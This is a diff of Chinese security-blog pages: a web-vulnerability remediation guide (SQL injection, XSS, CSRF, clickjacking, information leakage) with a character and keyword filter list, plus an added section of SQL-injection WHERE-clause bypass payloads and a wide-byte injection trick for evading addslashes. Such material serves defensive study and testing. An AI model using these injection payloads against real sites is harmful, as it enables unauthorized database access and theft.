@@ -209,13 +209,13 @@
       
         
           <span itemprop="articleBody"><h2 id="SQL注入">SQL注入</h2><p>等级：紧急</p>
-<p>描述：SQL注入利用现有应用程序，将恶意的SQL命令注入到后台数据库引擎执行，它可以通过在Web表单构造恶意SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。可以直接或间接的获取数据库内容，危害较大。</p>
+<p>描述：SQL注入利用现有应用程序，将恶意的SQL命令注入到后台数据库引擎执行，它可以通过在Web表单构造恶意SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句.<br>可以直接或间接的获取数据库内容，危害较大.</p>
 <p>建议：</p>
 <p>1.过滤客户端提交的敏感字符，提交的区域包括：<strong>地址栏中的所有参数，请求头信息，cookie中的参数</strong>，需要过滤的字符如下：<br><code>|</code>–<code>&amp;</code>–<code>;</code>–<code>$</code>–<code>%</code>–<code>@</code>–<code>&#39;</code>;<br><code>&quot;</code>–<code>&lt;</code>–<code>&gt;</code>–<code>(</code>;<code>)</code>–<code>+</code>–<code>CR</code>;<br><code>LF</code>–<code>,</code>–<code>.</code>–<code>select</code>–<code>from</code>;<br><code>update</code>–<code>delete</code>–<code>union</code>–<code>and</code>–<code>or</code>;<br>2.白名单策略：定制允许客户端输入的长度，类型.<br>3.做好数据库用户权限管理，只给用户开放必要权限.</p>
 <h2 id="XSS跨站脚本攻击">XSS跨站脚本攻击</h2><p>1.反射型xss<br>等级：低</p>
-<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。反射型XSS通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行。它的特点是非持久化，必须用户点击带有特定参数的链接才能引起。</p>
+<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.<br>反射型XSS通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行.<br>它的特点是非持久化，必须用户点击带有特定参数的链接才能引起.</p>
 <p>2.存储型XSS<br>等级：中</p>
-<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。存储型XSS通过上传非法代码，当用户触发恶意代码，浏览器就执行攻击者定义的脚本程序。</p>
+<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.<br>存储型XSS通过上传非法代码，当用户触发恶意代码，浏览器就执行攻击者定义的脚本程序.</p>
 <p>建议：<br>  1.对用户输入进行数据合法性验证:</p>
 <table>
 <thead>
@@ -259,23 +259,31 @@
 </tr>
 </tbody>
 </table>
-<p>  2.为Cookie加上HttpOnly标记:<br>  许多XSS攻击的目标就是窃取用户Cookie。窃取Cookie一般都会依赖JavaScript读取 Cookie信息，而HttpOnly标记的cookie不允许被JS操作，这样即使Web应用产生了XSS漏洞，Cookie信息也能得到较好的保护。</p>
+<p>  2.为Cookie加上HttpOnly标记:<br>  许多XSS攻击的目标就是窃取用户Cookie.<br>窃取Cookie一般都会依赖JavaScript读取 Cookie信息，而HttpOnly标记的cookie不允许被JS操作，这样即使Web应用产生了XSS漏洞，Cookie信息也能得到较好的保护.</p>
 <h2 id="CSRF跨站请求伪造">CSRF跨站请求伪造</h2><p>等级：中</p>
-<p>描述：攻击者盗用用户身份，以用户名义发送恶意请求。CSRF可能造成的危害包括：以用户名义发送邮件，发消息，盗取账号，甚至于购买商品，虚拟货币转账，个人隐私泄露以及财产安全。</p>
-<p>建议：<br>1.验证HTTP Referer字段：<br>验证每一个请求的Referer值，如果来自本站，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。<br>2.在HTTP请求中以参数的形式(或是通过XMLHttpRequest这个类加到请求头中)加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
+<p>描述：攻击者盗用用户身份，以用户名义发送恶意请求.<br>CSRF可能造成的危害包括：以用户名义发送邮件，发消息，盗取账号，甚至于购买商品，虚拟货币转账，个人隐私泄露以及财产安全.</p>
+<p>建议：<br>1.验证HTTP Referer字段：<br>验证每一个请求的Referer值，如果来自本站，是合法的.<br>如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求.</p>
+<p>2.在HTTP请求中以参数的形式(或是通过XMLHttpRequest这个类加到请求头中)加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求.</p>
 <h2 id="clickjaking点击劫持">clickjaking点击劫持</h2><p>级别：低</p>
-<p>描述：点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情 的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。</p>
-<p>建议：在头信息中添加X-FRAME-OPTIONS字段，禁止网站使用ifame载入网页.<br>X-Frame-Options响应头。赋值有如下三种：</p>
-<pre><code><span class="number">1</span>.DENY：不能被嵌入到任何iframe或者frame中。
-<span class="number">2</span><span class="class">.SAMEORIGIN</span>:页面只能被本站页面嵌入到iframe或者frame中。
-<span class="number">3</span><span class="class">.ALLOW-FROM</span> uri：只能被嵌入到指定域名的框架中。
+<p>描述：点击劫持是一种视觉上的欺骗手段.<br>攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情 的情况下点击透明的iframe页面.<br>通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上.</p>
+<p>建议：在头信息中添加X-FRAME-OPTIONS字段，禁止网站使用ifame载入网页.<br>X-Frame-Options响应头.<br>赋值有如下三种：</p>
+<pre><code><span class="number">1</span>.DENY：不能被嵌入到任何iframe或者frame中.
+
+<span class="number">2</span><span class="class">.SAMEORIGIN</span>:页面只能被本站页面嵌入到iframe或者frame中.
+
+<span class="number">3</span><span class="class">.ALLOW-FROM</span> uri：只能被嵌入到指定域名的框架中.
 </code></pre><p>apache可配置http.conf如下：</p>
 <pre><code><span class="tag">&lt;IfModule headers_module&gt;</span>
 <span class="keyword"><span class="common">Header</span></span> always append X-Frame-Options <span class="string">"DENY"</span>
 <span class="tag">&lt;/IfModule&gt;</span>
 </code></pre><h2 id="页面敏感信息泄露">页面敏感信息泄露</h2><p>级别：视泄露信息而定</p>
-<p>描述：<br>各种不同方式的敏感信息泄露给攻击者提供了信息。<br>1.直接访问敏感信息文件<br>2.敏感信息(电话号码，内网IP，邮箱)显示在了页面，源码，url地址中。<br>3.返回页面暴漏敏感信息(服务器版本，服务器物理路径…)。<br>4….发现再补</p>
-<p>建议(一一对应):<br>1.限制对该文件的访问。<br>2.确认页面中电话号码，IP用途，站点可根据网站自身情况是否去除号码.<br>3.如果是正常页面中包含路径信息，如果不需要该路径信息，删除该信息。<br>  如果是错误信息中包含路径信息，需要屏蔽应用程序错误信息。</p>
+<p>描述：<br>各种不同方式的敏感信息泄露给攻击者提供了信息.</p>
+<p>1.直接访问敏感信息文件<br>2.敏感信息(电话号码，内网IP，邮箱)显示在了页面，源码，url地址中.</p>
+<p>3.返回页面暴漏敏感信息(服务器版本，服务器物理路径…).</p>
+<p>4….发现再补</p>
+<p>建议(一一对应):<br>1.限制对该文件的访问.</p>
+<p>2.确认页面中电话号码，IP用途，站点可根据网站自身情况是否去除号码.<br>3.如果是正常页面中包含路径信息，如果不需要该路径信息，删除该信息.</p>
+<p>  如果是错误信息中包含路径信息，需要屏蔽应用程序错误信息.</p>
 </span>
         
       
@@ -493,6 +501,21 @@ mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <spa
 <span class="comment">//在and/or之后使用 ！ ~ 代替空格如果注入参数是字符型则and前面的空格可以省略。</span>
 </code></pre><h2 id="and或or后面可以跟的字符">and或or后面可以跟的字符</h2><p><strong>符号: Space , + , - , ~ , ! , @ </strong></p>
 <pre><code>mysql&gt; SELECT <span class="number">1</span> FROM dual WHERE <span class="number">1</span>=<span class="number">1</span> AND-+-+-+-+~~((<span class="number">1</span>));
+</code></pre><h2 id="Where后条件的各种转换姿势">Where后条件的各种转换姿势</h2><pre><code> <span class="string">' or "a"='</span>a<span class="string">'
+'</span> <span class="keyword">or</span> <span class="string">'a'</span>=n<span class="string">'a'</span>               <span class="comment">//unicode</span>
+<span class="string">' or '</span>a<span class="string">'=b'</span><span class="number">1100001</span><span class="string">'         //binary
+'</span> <span class="keyword">or</span> <span class="string">'a'</span>=x<span class="string">'61'</span>              <span class="comment">//16进制</span>
+<span class="string">' or 1=true #true=1, false=0
+'</span> <span class="keyword">or</span> <span class="number">1</span> #<span class="keyword">true</span>
+<span class="string">' or version()=5.5 #5.5.41-log
+'</span> <span class="keyword">or</span> round(pi(),<span class="number">1</span>)+<span class="keyword">true</span>+<span class="keyword">true</span>+<span class="number">0.4</span>=version() <span class="string">#3</span>.<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">0.4</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">'a'</span>=<span class="string">'b'</span>=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">'a'</span>=<span class="string">'b'</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="keyword">false</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="number">0</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">true</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users
 </code></pre><h2 id="宽字节注入">宽字节注入</h2><p>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
 <p><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="external">摘自乌云知识库</a></p>
 </span>
